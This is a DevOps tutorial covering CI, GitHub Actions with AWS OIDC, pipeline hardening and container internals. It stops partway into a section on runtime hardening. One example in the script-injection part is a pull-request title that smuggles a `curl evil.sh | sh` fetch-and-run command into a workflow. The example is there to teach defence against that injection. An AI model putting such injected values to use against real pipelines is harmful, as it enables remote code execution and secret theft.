## 1. Why DevOps exists 🎓

### Problem: two teams with opposite incentives
In mid-size and large companies there were traditionally two teams:

| Team | Does | Measured by |
|---|---|---|
| **Dev** (backend, frontend, QA) | writes code | how fast features reach production |
| **Ops** (infrastructure) | sets up servers, monitors downtime and alerts | how rarely production goes down |

**First-principles view:** every deploy touches production and adds **entropy**, so ops is rewarded for having **as few deploys as possible**, while dev is rewarded for **as many as possible**. When production breaks, dev blames the machines and ops blames the code. Releases slow to **once a week or every two weeks**, because each one needs everybody aligned.

### The movement
People found fixes, applied them at scale and wrote them down. The collection of those ideas became **DevOps**:
- **Infrastructure automated with code**, not servers configured by hand each time.
- **All code in shared version control**, with the **infrastructure config in the same place**.
- **One command to build** and **one command to deploy**, instead of a multi-step ritual.
- **Feature flags**: turn features on and off from a central place (database, edge cache) **without deploying**.
- **Shared observability**: logs, alerts and metrics (CPU, memory) visible to developers too, not only to ops.

**The common thread:** make deployment **small, cheap and boring**. One button, one merge, a few seconds to start, not a 2–3 hour checklist. When deploying is cheap, nobody hesitates to do it several times a day.

### Measuring it: the four DORA metrics 🎓
The **DORA** team has surveyed tens of thousands of teams over many years and settled on four numbers:

| | Metric | Meaning | Example |
|---|---|---|---|
| Speed | **Change lead time** | commit merged → live in production | merged 9:00, live 11:00 = **2 h** |
| Speed | **Deployment frequency** | how often you deploy to production | |
| Stability | **Change failure rate** | % of deploys that cause a production failure | 4 of 100 = **4%** |
| Stability | **Failed deployment recovery time** | how long recovery takes after such a failure | |

The **2024** results:

| Group | Deploys | Lead time | Failure rate | Recovery |
|---|---|---|---|---|
| Top (about **20%** of teams) | **on demand** | **under a day** | **about 5%** | **under an hour** |
| Bottom | **every 1–6 months** | | **about 40%** | **about a week** |

**The counter-intuitive takeaway: speed and stability are not a trade-off.** The teams that deploy most are also the most stable.

### Why more speed gives more stability 🎓
- **Monthly deploy:** a month of changes from 10–20 people, about **200 commits**. When something breaks (it will), finding the guilty commit can take **a day**, and the fix ships in another big deploy. By then the authors have forgotten the details.
- **Per-commit deploy:** each deploy has **one change from one person**, written an hour or a day ago. The cause is obvious, and the context is still fresh in the author's head, so the fix is fast.

**Thumb rule: deploy as often as possible, in changes as small as possible.**

## 2. Continuous integration 🎓

### What it is
**Every developer merges into one shared branch at least once a day, and every merge is verified by an automated build that runs all the tests.**

- "CI" often means *the server* that runs tests on push. Technically, **CI is the practice**; the server only **enforces** it. It can check that a merge passes, but it can't make people merge daily.

### Why daily
- **Problem:** two engineers each work on a feature branch for **3 weeks**. When they finally merge, the branches have drifted so far that resolving conflicts takes **hours**, and it's easy to break the intent of each other's changes.
- **Mechanism:** with daily merges you only reconcile **one day** of change against main. Even if 10 engineers pushed that day, conflicts take **minutes** and everyone still remembers their own changes.

### Branching models 🎓
- **Git Flow:** `develop`, `release/*`, `hotfix/*` and `master`/`main` (finished releases). Still very popular. **Its own author wrote, about 10 years later, that teams shipping web apps continuously should use something simpler.** It was designed for software that ships **versions customers install** (desktop, mobile), where you must support v2 while building v3.
- A **backend has exactly one version in production: the latest.** So the better fit is **trunk-based development**:
  - one `main` branch,
  - short-lived feature branches (a day or two), deleted after merge,
  - **every release cut from `main`**.
- **"My feature takes 3 weeks"?** Merge in small pieces every day or two, deploy them, and keep the unfinished feature **behind a feature flag**. It's in production but invisible to users.

<Mermaid chart={`gitGraph
  commit id: "main"
  branch feat-a
  commit id: "a1"
  checkout main
  merge feat-a id: "deploy 1"
  branch feat-b
  commit id: "b1 (flag off)"

```ts title="🔧 a feature flag check (flags stored in Postgres, cached briefly)"
@Injectable()
export class Flags {
  private cache = new Map<string, { on: boolean; at: number }>();
  constructor(private readonly db: DataSource) {}

  async isOn(name: string, userId?: string): Promise<boolean> {
    const hit = this.cache.get(name);
    if (hit && Date.now() - hit.at < 30_000) return hit.on;
    const [row] = await this.db.query('SELECT enabled, rollout_pct FROM feature_flags WHERE name = $1', [name]);
    const on = !!row?.enabled && (userId ? bucket(userId) < row.rollout_pct : row.rollout_pct === 100);
    this.cache.set(name, { on, at: Date.now() });
    return on;
  }
}
// bucket(): stable hash of userId into 0..99, so a user stays in or out of a partial rollout
```

🔧 **Edge cases:** flags are config that changes at runtime, so they need an owner and a removal date, or they pile up as dead branches in the code. A flag must default to **off** if the flag store is unreachable.

## 3. What a build is 🎓

**A build turns source code into something that runs:** compile, download dependencies, package it all into an **artifact** (a binary, a bundle, an executable).

**Key property (from the Twelve-Factor lesson):** a build must **not depend on whatever is installed on the machine**. It declares its own compiler version and exact dependency versions, so **the same source + the same build config produce a byte-identical result every time**. The **lock file** is the input list that makes this possible.

| Stack | Reproducible build |
|---|---|
| Go | `go build` with a **pinned Go version** and a **committed `go.sum`** (not git-ignored) |
| Node | **`npm ci`** with the committed **`package-lock.json`** |

**Stamp the commit into the artifact.** Then a running process can tell you whether it's on the latest commit.

```ts title="🔧 stamping and exposing the version (NestJS)"
@Controller('health')
export class HealthController {
  @Get()
  health() {
    return { status: 'ok', commit: process.env.GIT_SHA, startedAt };   // unauthenticated, cheap
  }
}
const startedAt = new Date().toISOString();
```

## 4. The deployment pipeline 🎓

**CI + build = a deployment pipeline:** a sequence of stages the code passes through, ending live in production.

**Ordering rule: cheap and fast stages first, slow and expensive ones later.** A failure stops the pipeline right there, and the author hears about it within minutes.

<Mermaid chart={`flowchart LR
  P["push / merge"] --> S1["Stage 1: minutes<br/>compile + unit tests"]
  S1 -->|pass| S2["Stage 2: slower<br/>integration tests with a real DB"]
  S2 -->|pass| S3["Staging deploy<br/>maybe manual checks"]
  S3 -->|pass| S4["Production"]
  S1 -->|fail| X["stop + notify author"]
  S2 -->|fail| X
  S3 -->|fail| X`} />

### GitHub Actions: five words 🎓
| Term | Meaning |
|---|---|
| **Workflow** | a YAML file committed in **`.github/workflows/`**: when to run and what to run |
| **Event** | the trigger: push, pull request, schedule, manual click |
| **Job** | a set of steps on **one machine**; jobs can run in parallel or wait for each other |
| **Runner** | that machine: a **fresh VM** from GitHub, discarded afterwards (or **self-hosted** on your own infra) |
| **Step** | one command or action inside a job |

**Assume the runner is fresh every time.** Everything is installed from scratch (or restored from cache). That's why every workflow starts with a **checkout**.

### What the demo shows 🎓
A push triggers three jobs:
1. **test**: fresh Linux runner → checkout → set up Go → run tests.
2. **build**: **waits for test**, builds the binary, uploads it as an **artifact** (its size and digest are visible at the bottom of the run).
3. **image**: waits for both, builds the container image.

### 🔧 The same pipeline for Node/NestJS + AWS

```yaml title=".github/workflows/ci.yml"
name: ci
on:
  push: { branches: [main] }
  pull_request:

permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:16.4
        env: { POSTGRES_PASSWORD: test, POSTGRES_DB: app_test }
        ports: ["5432:5432"]
        options: >-
          --health-cmd "pg_isready -U postgres" --health-interval 5s --health-retries 10
    env:
      DATABASE_URL: postgres://postgres:test@localhost:5432/app_test
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version-file: .nvmrc, cache: npm }
      - run: npm ci
      - run: npm run lint && npm test            # stage 1: fast
      - run: npm run test:integration            # stage 2: against the real Postgres service

  build:
    needs: test
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version-file: .nvmrc, cache: npm }
      - run: npm ci && npm run build
      - uses: actions/upload-artifact@v4
        with: { name: dist-${{ github.sha }}, path: dist/ }

  image:
    needs: [test, build]
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    permissions:
      id-token: write                            # needed for OIDC (section 5)
      contents: read
    steps:
      - uses: actions/checkout@v4
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/gha-ecr-push
          aws-region: eu-west-1
      - uses: aws-actions/amazon-ecr-login@v2
        id: ecr
      - uses: docker/setup-buildx-action@v3
      - uses: docker/build-push-action@v6
        with:
          context: .
          push: true
          build-args: GIT_SHA=${{ github.sha }}
          tags: ${{ steps.ecr.outputs.registry }}/api:${{ github.sha }}
          cache-from: type=gha
          cache-to: type=gha,mode=max
```

## 5. Pipeline credentials: from repo secrets to OIDC 🎓

### Problem
At some point the pipeline must touch your cloud (push an image, deploy). It runs on **GitHub's** infrastructure; your cloud is a **different company**. It needs credentials.

- **Old way: repository secrets.** You store long-lived cloud keys as secrets; workflows reference them and they're masked in logs.
- **Why that's weak:** **every job and action in the repo can read them**, and if they leak, anyone can use them **from anywhere until someone rotates them**.

### Mechanism: OpenID Connect (OIDC)
1. When a job starts, GitHub's identity provider issues a **short-lived, signed token** (a JSON document) saying: *this is a job in repo X, on branch Y, in workflow Z*.
2. You've configured AWS beforehand to **trust tokens signed by GitHub, but only when the claims say this repo and the main branch**.
3. The job presents the token. AWS **checks the signature and the claims** and returns **temporary credentials**.
4. Those credentials **expire with the job** and are useless anywhere else. **No permanent cloud key is stored anywhere.**

<Mermaid chart={`sequenceDiagram
  autonumber
  participant J as GitHub Actions job
  participant GH as GitHub OIDC provider
  participant STS as AWS STS
  participant ECR as AWS ECR / ECS
  J->>GH: request ID token (needs id-token write)
  GH-->>J: signed JWT: repo, ref, workflow, aud
  J->>STS: AssumeRoleWithWebIdentity(JWT, role ARN)
  STS->>STS: verify signature + trust policy conditions
  STS-->>J: temporary credentials (minutes to an hour)
  J->>ECR: push image / deploy
  Note over J,STS: nothing long-lived is stored in the repo`} />

```json title="🔧 IAM role trust policy: only main of one repo may assume it"
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": { "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com" },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
          "token.actions.githubusercontent.com:sub": "repo:acme/api:ref:refs/heads/main"
        }
      }
    }
  ]
}
```

🔧 **Edge cases:**
- Pull-request workflows have a different `sub` (`repo:acme/api:pull_request`), so they **can't** assume the deploy role. That's the point: an untrusted PR can't deploy.
- Using **GitHub environments** makes the `sub` look like `repo:acme/api:environment:production`, which ties the role to an environment with required reviewers.
- Don't use `StringLike` with `repo:acme/*`: any repo in the org (or a fork-like naming trick) could then deploy.
- Give the role **least privilege**: ECR push for the image job, ECS update for the deploy job, as separate roles.

## 6. Hardening the pipeline itself ➕

OIDC removes the long-lived cloud key, but the pipeline is still a machine that runs code from many sources with write access to production, so the rest of its attack surface needs the same treatment.

<Mermaid chart={`flowchart LR
  DEV["developer push"] -->|"1. secret in a commit"| REPO[("repo")]
  TP["third-party action"] -->|"2. tag moved to malicious code"| JOB["CI job<br/>has tokens + cloud role"]
  PR["fork pull request"] -->|"3. untrusted code or text"| JOB
  REPO --> JOB
  JOB -->|"4. runner reused or shared"| RUN["runner"]
  JOB --> PROD["registry + production"]`} />

#### Stop secrets before they reach the repository ➕
- **Problem:** someone commits an API key "just for a minute". Even if the next commit deletes it, the key lives in **Git history**, in every clone and fork, and in any CI log that printed it. Bots scan public repositories for keys within minutes of a push.
- **Why it happens:** Git is append-only by design. Removing a line creates a new commit; the old one is still there.
- **Mechanism:** scan **at push time**, so the secret is rejected before it is stored, and scan again in CI as a backstop.
  - **GitHub push protection** blocks a push that contains a recognised secret pattern and explains why. Bypassing needs a stated reason and creates an alert. It is on by default for pushes to public repositories.
  - A scanner in CI (for example **gitleaks**) also catches custom formats such as your own internal tokens.

```yaml title=".github/workflows/secret-scan.yml"
name: secret-scan
on: [push, pull_request]
permissions: { contents: read }
jobs:
  gitleaks:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with: { fetch-depth: 0 }            # scan the full history the push brings, not just the tip
      - name: gitleaks
        run: |
          docker run --rm -v "$PWD:/repo" zricethezav/gitleaks:latest \
            git /repo --redact --exit-code 1
```

- **Edge cases:** once a secret has been pushed, **rotate it first**. Rewriting history is cleanup, not remediation, because you can't un-share clones and caches. Scanners match patterns, so a password in a generic `config.json` may slip through; the real fix is still keeping secrets out of the repo (secret manager, OIDC). Pin the scanner image by digest in a real pipeline, for the reason in the next subsection.

#### Pin third-party actions to a commit SHA ➕
- **Problem:** `uses: some-org/some-action@v4` looks pinned, but a **tag is a movable pointer**. Whoever controls that repository (or whoever steals their credentials) can point `v4` at new code, and your next run executes it with your tokens.
- **A real case:** in **March 2025** the popular `tj-actions/changed-files` action was compromised (**CVE-2025-30066**). The attacker **moved existing version tags** to a commit that dumped the runner's secrets into the workflow log. Public repositories exposed those secrets to anyone reading the logs. Workflows pinned to a full commit SHA were not affected.
- **Mechanism:** a **full-length commit SHA** is the only immutable reference to an action, the same "digest, not tag" idea as container images (section 14). Keep the version in a comment for humans, and let Dependabot or Renovate open PRs to bump the SHA.

```yaml
steps:
  # tag: mutable. Whoever controls the repo decides what runs.
  - uses: some-org/changed-files@v45
  # full SHA: immutable. The comment is for humans, and Dependabot updates both.
  - uses: some-org/changed-files@2f7c5bfce28377bc069a65ba478de0a74aa0ca32 # v45.0.8
```

```yaml title=".github/dependabot.yml"
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule: { interval: weekly }
```

- **Edge cases:** an action pinned by SHA can still **download** code at run time (a script fetched from `main`, a `latest` container). Read what an action does before trusting it, especially small single-maintainer ones. GitHub can enforce SHA pinning through repository or organisation policy, so a new workflow can't quietly use a tag.

#### Treat pull-request content as untrusted input ➕
- **Problem 1, privileged triggers:** the `pull_request` trigger runs fork PRs **without** secrets and with a read-only token. `pull_request_target` runs in the context of the **base** repository, **with** secrets and write permissions. Checking out and running the PR's code under it gives a stranger's code your secrets.
- **Problem 2, script injection:** expressions are expanded into the script **before** the shell runs it. A PR titled `"; curl evil.sh | sh; echo "` becomes part of your command.
- **Why:** CI turns text into commands. Whatever the attacker controls (code, titles, branch names, commit messages) must be treated like user input to a SQL query.
- **Mechanism:** never run untrusted code in a privileged context, and pass untrusted values through **environment variables**, which the shell treats as data, never by direct interpolation.

```yaml
on: pull_request                # NOT pull_request_target for anything that builds or runs PR code
permissions: { contents: read }
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      # ❌ injection: the title is pasted into the script text
      # - run: echo "Title: ${{ github.event.pull_request.title }}"
      # ✅ the title is an env var: the shell sees a value, never code
      - env:
          TITLE: ${{ github.event.pull_request.title }}
        run: echo "Title: $TITLE"
```

- **Edge cases:** if you truly need `pull_request_target` (for example to comment on fork PRs), never check out the PR's head in that workflow. Split it into an unprivileged `pull_request` job that produces an artifact and a privileged `workflow_run` job that only reads that artifact, treating it as untrusted data.

#### Least-privilege tokens and ephemeral runners ➕
- **Problem:** a compromised step can only do what the job's credentials allow, and leave behind whatever the runner keeps between jobs.
- **Mechanism:**
  - **`GITHUB_TOKEN`**: set the organisation default to **read-only** and grant more per job (`packages: write` only for the job that pushes). The workflows in section 4 already start with `permissions: contents: read`.
  - **Separate jobs, separate cloud roles** (section 5): the test job gets no cloud role at all, and only the deploy job, gated by an environment with reviewers, can assume the deploy role.
  - **Runners:** GitHub-hosted runners are a fresh VM per job. **Self-hosted runners should almost never be used for public repositories**, because any fork PR can run code on them. If you self-host, make runners **ephemeral** (one job, then destroyed), and keep them away from production networks.

```yaml
jobs:
  test:
    permissions: { contents: read }             # no id-token: this job can't reach the cloud
  deploy:
    needs: test
    environment: production                      # required reviewers + an environment-scoped OIDC subject
    permissions: { contents: read, id-token: write }
```

- **Edge cases:** caches are shared across workflow runs. Caches written by an ordinary PR run are scoped to that PR's branch, but a `pull_request_target` workflow runs in the **base branch's** context, so a cache it writes can later be restored by release jobs on `main`. That's one more reason never to build PR code there. Secrets stored as **environment** secrets are only exposed to jobs that reference that environment, which is tighter than repository-wide secrets.

## 7. Versioning a service vs a library 🎓

- **Libraries** are versioned **for their users** with **semantic versioning**, `major.minor.patch`: a **patch** fixes a bug without changing behaviour, a **minor** adds something without breaking existing interfaces, a **major** breaks behaviour.
- **A deployed service is versioned for you, the team.** Its users are HTTP clients that don't care which deploy is running (this is not about API route versions like `/v2`). So no semver: **stamp each deploy with the commit hash** of `main` (sometimes plus a build ID).
  - the **artifact** carries the commit hash,
  - the **container image is tagged** with it,
  - the **running process exposes it** on a health or info endpoint, so after a deploy you can confirm production runs the latest code.

```bash
# 🔧 did the deploy land?
curl -s https://api.example.com/health | jq -r .commit    # compare with: git rev-parse origin/main
```

## 8. What do we actually ship? Containers 🎓

### Problem: the artifact works on my laptop, not on the server
- A **Go binary** runs locally, then fails on the server: an **older system library**, a **different certificate store**, **no time-zone database**.
- A **Node** service was written against **Node 22**, the server has **Node 18**, and a Node 22-only feature fails in production.

### Mechanism: ship the environment, not just the code
Not the whole OS, but everything the process needs (**runtime, libraries, files, exact versions**) packaged as one unit that behaves the same on a laptop, a data-center server or a rented VPS. That unit is a **container**: **a process with its own file system that sees only a small slice of the machine**.

### Container ≠ small VM 🎓

| | Virtual machine | Container |
|---|---|---|
| How | software **partitions the hardware**: virtual disks, **its own kernel** | an **ordinary process** started by the **host's kernel** |
| Kernel | one per VM | **shared** with the host |
| Isolation | **very strong** (the hypervisor keeps VMs apart) | weaker, enforced by kernel features |
| Cost | **GBs of RAM**, own disk, slow boot | megabytes, starts in about the time a process takes |

Run `ps` on a Linux host and **the container's process is right there in the list**. What makes it a "container" is the **special treatment the kernel gives it**: its own PIDs, hostname, root file system, network interfaces, and caps on memory and CPU. It's an **illusion of a separate machine**, built from three kernel features: **namespaces, cgroups and a layered file system**.

## 9. Namespaces: what a process can see 🎓

### Mechanism
A **namespace** wraps a **global resource** of the machine so that a group of processes gets **its own copy** of it. Each kind of resource has its own namespace:

| Namespace | Gives the container its own... |
|---|---|
| **PID** | process numbers; the container's first process is **PID 1** and it can't see outside processes |
| **UTS** | hostname |
| **mount** | table of mount points |
| **network** | interfaces, ports, routing table, so **two containers can both listen on port 80** |
| **IPC**, **user**, **cgroup**, **time** | the rest of the eight kinds in current Linux |

Only the kernel can create them, so you ask through **three system calls**:
- **`clone`**: create a new process, placed in new namespaces according to flags,
- **`unshare`**: move the calling process into new namespaces,
- **`setns`**: join an existing namespace.

Docker, Kubernetes and every container tool use exactly these.

### What the demo shows: a container in about 76 lines 🎓
The program is from **Liz Rice's "Containers from Scratch"** talk (Go). It **runs itself twice**:
1. The **parent** calls `clone` with **three flags: new UTS, new PID, new mount** namespace, and re-executes itself as `child`.
2. The **child** is **PID 1**, sets its **hostname to `container`** (visible only in its UTS namespace), **chroots into a folder holding an Ubuntu file system** (so `/` is now that folder), mounts a fresh **`/proc`** (so `ps` reads the new PID namespace), and runs a **shell**.
3. Inside: `hostname` says `container`, `ps` shows only a couple of processes with the program as PID 1, and the files are Ubuntu's. On the host, `pstree` finds that same shell under the program with an **ordinary host PID**.

```go title="Go, condensed from Containers from Scratch (Liz Rice)"
func run() {                                  // parent
	cmd := exec.Command("/proc/self/exe", append([]string{"child"}, os.Args[2:]...)...)
	cmd.Stdin, cmd.Stdout, cmd.Stderr = os.Stdin, os.Stdout, os.Stderr
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Cloneflags: syscall.CLONE_NEWUTS | syscall.CLONE_NEWPID | syscall.CLONE_NEWNS,
	}
	must(cmd.Run())
}

func child() {                                // PID 1 inside the new namespaces
	must(syscall.Sethostname([]byte("container")))
	must(syscall.Chroot("/home/liz/ubuntufs"))
	must(os.Chdir("/"))
	must(syscall.Mount("proc", "proc", "proc", 0, ""))
	cmd := exec.Command(os.Args[2], os.Args[3:]...)
	cmd.Stdin, cmd.Stdout, cmd.Stderr = os.Stdin, os.Stdout, os.Stderr
	must(cmd.Run())
	must(syscall.Unmount("proc", 0))
}
```

```bash
# 🔧 the same effect without writing code (util-linux unshare)
sudo unshare --uts --pid --mount --fork --mount-proc bash
hostname container && hostname     # container
ps aux                             # bash is PID 1, almost nothing else visible
```

## 10. Control groups: how much a process can use 🎓

### Problem
Namespaces control what a process **sees**, not what it **uses**. A container with its own process list can still **eat all of the host's memory**.

### Mechanism: cgroups are folders of plain files
- The kernel exposes a file system at **`/sys/fs/cgroup`**. **Creating a folder there creates a group.**
- Inside are plain files such as **`memory.max`**, **`cpu.max`** and **`pids.max`**. Write a value into `memory.max` and **every process in the group shares that limit**.
- Write a PID into **`cgroup.procs`** and that process **joins** the group.

**When Kubernetes says a container has a 512 MB memory limit, the kubelet writes that number into `memory.max`.** Exceed it and the kernel's **OOM killer** kills the process: the famous **`OOMKilled`** status.

### What the demo shows 🎓
A program keeps allocating memory inside a group. The memory column climbs **up to the limit and stops**: the kernel killed it, and the **kernel log** says exactly why.

```bash
# 🔧 reproduce it on a cgroup v2 host (as root)
mkdir /sys/fs/cgroup/demo
echo 100M  > /sys/fs/cgroup/demo/memory.max
echo "50000 100000" > /sys/fs/cgroup/demo/cpu.max   # 50 ms of CPU per 100 ms = half a core
echo $$ > /sys/fs/cgroup/demo/cgroup.procs           # this shell (and its children) join
python3 -c "x = bytearray(500 * 1024 * 1024)"        # killed
dmesg | tail -n 3                                    # "Memory cgroup out of memory: Killed process ..."
```

🔧 **Edge case for Node:** V8 sizes its heap from its own defaults, not from the cgroup limit in every version. Set `--max-old-space-size` to roughly 75% of the container limit, or the kernel OOM-kills the process before V8 ever garbage-collects hard.

## 11. The layered file system 🎓

### Problem
The toy container chrooted into a ~**100 MB** Ubuntu folder. Copying 100 MB for every container start would be absurd.

### Mechanism: layers + OverlayFS
- A **layer** is a **tarball of changes**: files added, modified, deleted.
- An **image** is a **stack of layers**. The kernel stacks them at runtime with **OverlayFS** (on Linux):
  - several **lower directories**, **read-only**,
  - one **upper directory**, **writable**,
  - presented as a **single merged view**.
- **Read:** the file comes from the **topmost layer that has it**.
- **Write:** the file is **copied up** into the upper layer and modified there (copy-on-write). **Lower layers never change.**
- So **10 containers from one image share every layer**; each only gets a **thin writable layer** of its own.
- **Write a file, stop the container, and the file is gone**, because it lived in the upper directory. **A container's file system is disposable**; persist data elsewhere (the Twelve-Factor point again).

```bash
# 🔧 OverlayFS by hand
mkdir lower1 lower2 upper work merged
echo base > lower1/a.txt
sudo mount -t overlay overlay -o lowerdir=lower2:lower1,upperdir=upper,workdir=work merged
echo changed > merged/a.txt
cat lower1/a.txt    # base     (untouched)
cat upper/a.txt     # changed  (copied up)
```

## 12. What an image really is 🎓

### Blobs 🎓
A **blob** is unstructured binary data (a PDF, a video). Unlike a text file, you can't read or edit it character by character; it only makes sense as a whole.

### An image = blobs + three kinds of documents 🎓
- **Layer blobs**, each identified by the **SHA-256 of its bytes**.
- A **config** (JSON): the layers in order plus the **start settings**: command, environment, working directory, ports (what you write in a Dockerfile).
- A **manifest** (JSON): points to the config and each layer, with their **sizes and hashes**.
- **The image's identity is the hash of the manifest** (the **digest**).

**Why hashes everywhere:** two images sharing a base layer share it **by hash**, so a registry stores it **once**. Change one Dockerfile line and **only the layers after it change**; earlier layers keep the same hash. **Tags** like `ubuntu:24.04` or `myapp:abc123` are **names pointing at a digest**.

**Analogy: an image is like a Git commit, for a file system.**

<Mermaid chart={`flowchart TD
  T["tag api:3f9c2e1"] --> M["manifest<br/>digest sha256:9a1f = image identity"]
  M --> CFG["config JSON<br/>cmd, env, workdir, ports, layer order"]
  M --> L1["layer sha256:aa..<br/>base OS"]
  M --> L2["layer sha256:bb..<br/>CA certificates"]
  M --> L3["layer sha256:cc..<br/>app binary 11 MB"]`} />

The demo opens an image in a layer viewer: a **base layer**, a layer that **added certificates**, and one that **added the 11 MB binary**. Selecting a layer shows the file tree it changed.


## 13. Dockerfiles: layers, cache order, multi-stage 🎓

**A Dockerfile is the recipe that produces the layers.** Each file-system-changing instruction makes one layer:
- **`FROM`** picks the base image,
- **`COPY`** adds files,
- **`RUN`** executes a command.

### Problem: slow builds from a bad order
The builder caches each layer **by the instruction and its inputs**. The cache is used **top-down until the first instruction whose inputs changed; everything after it is rebuilt**.

- **Bad order:** copy the whole source tree, then install dependencies. Every code change invalidates the copy, so **all dependencies reinstall on every build**.
- **Good order:** copy only the **dependency manifest** (`package.json`, `go.mod`, `Cargo.toml`...), install, **then** copy the source. You change code ~100 times a day and dependencies rarely, so normally only the last layers rebuild.

### Multi-stage builds
For compiled languages (Go, Rust): **stage 1** has the compiler and builds the binary; **stage 2** starts from a **tiny base image** and copies **only the binary**. Compile-time tools never reach the final image, which shrinks it a lot.

### 🔧 A production NestJS Dockerfile using both ideas

```dockerfile title="Dockerfile"
# syntax=docker/dockerfile:1.7

# ---------- build stage: dev dependencies + TypeScript compiler ----------
FROM node:22.11-bookworm-slim AS build
WORKDIR /app
# manifest first: this layer is reused until dependencies change
COPY package.json package-lock.json ./
RUN --mount=type=cache,target=/root/.npm npm ci
# source last: code changes only rebuild from here
COPY tsconfig*.json nest-cli.json ./
COPY src ./src
RUN npm run build && npm prune --omit=dev

# ---------- runtime stage: no compiler, no dev deps, non-root ----------
FROM node:22.11-bookworm-slim AS runtime
ENV NODE_ENV=production
WORKDIR /app
COPY --from=build --chown=node:node /app/node_modules ./node_modules
COPY --from=build --chown=node:node /app/dist ./dist
COPY --chown=node:node package.json ./
ARG GIT_SHA=dev
ENV GIT_SHA=$GIT_SHA
USER node
EXPOSE 3000
# exec form: node is PID 1 and receives SIGTERM directly
CMD ["node", "dist/main.js"]
```

```text title=".dockerignore"
node_modules
dist
.git
.env*
coverage
```

🔧 **Edge cases:** without `.dockerignore`, `COPY . .` sends `node_modules` and `.env` into the build context (slow, and a secret leak). `ARG GIT_SHA` placed early would bust the cache on every commit, so it goes near the end. A Go binary on `scratch` or distroless needs CA certificates and tzdata copied in, which is exactly the "works on my laptop" failure from section 8.

## 14. Registries 🎓

### Why a registry sits between build and run
Build and run can happen on **different machines**. An artifact left on the build machine is invisible to the machine that runs it. So: **build → push to registry → (any machine) pull → run.**

### What a registry is
**An HTTP server with two kinds of objects:**
- **blobs**, stored and fetched **by digest**,
- **manifests**, fetched **by tag or digest**.

**Push:** upload each layer blob the registry **doesn't already have** (checked by hash), then the config, then the manifest.
**Pull:** download the manifest, read the layer digests, fetch **only the layers missing locally**. That's why pulling a new version after a small code change takes **seconds**: base and dependency layers are already there.

Examples: **Docker Hub**, **GitHub's** registry, and every major cloud (AWS, GCP, Azure). You can even **run your own registry in a container**.

<Mermaid chart={`sequenceDiagram
  autonumber
  participant N as Node pulling
  participant R as Registry
  N->>R: GET manifest api:3f9c2e1
  R-->>N: manifest (layer digests aa, bb, cc)
  N->>N: have aa and bb locally already
  N->>R: GET blob cc
  R-->>N: 11 MB layer
  Note over N: start in seconds, base layers reused`} />

🔧 **Deploy by digest, not tag.** A tag is a movable pointer; `api@sha256:9a1f...` always means the same bytes. Turn on **tag immutability** in ECR so a tag can't be overwritten.

## 15. Who actually runs a container 🎓

`docker run` doesn't make any system calls itself; **the `docker` command is just a client**.

<Mermaid chart={`flowchart LR
  CLI["docker CLI"] -->|"socket"| D["dockerd<br/>daemon"]
  D --> CD["containerd<br/>images, layers, overlay mounts, lifecycle"]
  CD --> RC["runc<br/>reads JSON spec: clone/unshare,<br/>cgroup files, chroot, exec"]
  RC -.->|"exits"| SH["shim<br/>stays as parent"]
  SH --> P["your process"]
  K["Kubernetes kubelet"] -->|"CRI"| CD`} />

1. The **client** talks over a socket to **`dockerd`**.
2. `dockerd` hands the job to **`containerd`**, a smaller daemon that manages images and container lifecycles: pulling layers, setting up the overlay mount, keeping processes running.
3. `containerd` asks **`runc`** to start it. `runc` reads a **JSON description**, makes the **`clone`/`unshare`** calls with the right flags, writes the **cgroup files**, changes the root and **execs** the process. Then runc **exits**, leaving a tiny **shim** as the parent.

The demo shows runc's C code creating namespaces **in three stages**: the parent clones a child, the child reads the flags and unshares into the new namespaces. **The same system calls as the toy program.**

### Why so many pieces: the OCI standard 🎓
The **Open Container Initiative** defines three things: **how an image is laid out**, **how a runtime is told to run it**, and **how a registry serves it**. That's why an image built with Docker runs in a **Kubernetes cluster with no Docker at all**: the kubelet talks to containerd over the **CRI** interface, and containerd talks to runc.

## 16. What makes a good image 🎓

| Property | Why | 🔧 How |
|---|---|---|
| **Small** | fewer files to patch, less to download every deploy | multi-stage, slim or distroless base |
| **One process** | the container runs your service and nothing else: no init system, no cron inside | separate containers or process types |
| **Non-root** | a security bug in your code doesn't become root on the host's kernel | `USER node` |
| **Pinned** | a specific base version, never `latest`, so builds are reproducible next month | `node:22.11-bookworm-slim@sha256:...` |
| **Scanned** | base images and packages have known vulnerabilities published weekly | a scanner in CI |

## 17. Hardening the image and the container at runtime ➕

The table above makes the image small, non-root and scanned; the next step assumes an attacker will one day get code execution inside the container (a dependency bug, an injection) and limits what that code can do.

**First principle:** a container shares the host's kernel (section 8). Everything that reaches the kernel from inside the container (system calls, Linux capabilities, writable paths) is attack surface. Hardening means **removing what your Node process never uses**.

<Mermaid chart={`flowchart TB
  A["attacker gets code execution<br/>in the container"] --> Q1{"shell, curl, package manager?"}
  Q1 -->|"distroless: none"| B1["harder to download tools or explore"]
  A --> Q2{"write to the filesystem?"}
  Q2 -->|"read-only root"| B2["can't drop a backdoor or alter code"]
  A --> Q3{"become root, use capabilities?"}
  Q3 -->|"non-root, drop ALL, no escalation"| B3["kernel attack surface shrinks"]
  A --> Q4{"unusual syscalls?"}
  Q4 -->|"seccomp RuntimeDefault"| B4["blocked by the kernel filter"]`} />

#### Distroless base images: nothing to live off ➕
- **Problem:** even a "slim" Debian image ships a shell, `apt`, and dozens of utilities. Your service never uses them, but an attacker does: download a tool with `curl`, explore with `sh`. Every package is also one more line in the vulnerability scanner's report.
